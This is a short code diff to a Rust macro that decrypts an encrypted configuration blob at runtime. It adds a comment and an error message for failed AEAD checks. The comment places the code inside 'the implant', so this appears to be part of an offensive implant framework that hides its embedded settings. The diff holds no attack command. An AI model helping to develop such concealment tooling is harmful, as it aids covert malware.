@@ -98,6 +98,13 @@ pub fn embed(input: TokenStream) -> TokenStream {
         }
     };
 
+    // The embedded key/nonce/ciphertext are generated in this same macro
+    // invocation (just above), so a `decrypt` failure here can only mean the
+    // build-time encrypt and runtime decrypt went out of sync — i.e. a broken
+    // build, never a runtime attack. This expansion runs at *runtime* inside
+    // `embed!` consumers; under the implant's `panic = "abort"` a tag mismatch
+    // would abort with no diagnostic. Surface a message naming the macro so a
+    // build-integration break is identifiable from a crash dump, then unwind.
     let expanded = quote!({
         #key_warning
         nyx_config::decrypt(
@@ -105,6 +112,7 @@ pub fn embed(input: TokenStream) -> TokenStream {
             &[#(#nonce_bytes),*],
             &[#(#ct_bytes),*][#pad..],
         )
+        .expect("nyx_config::embed!: build-time-encrypted config failed AEAD                  verification at runtime (key/nonce/ciphertext out of sync —                  rebuild the consuming crate)")
     });
     expanded.into()
 }
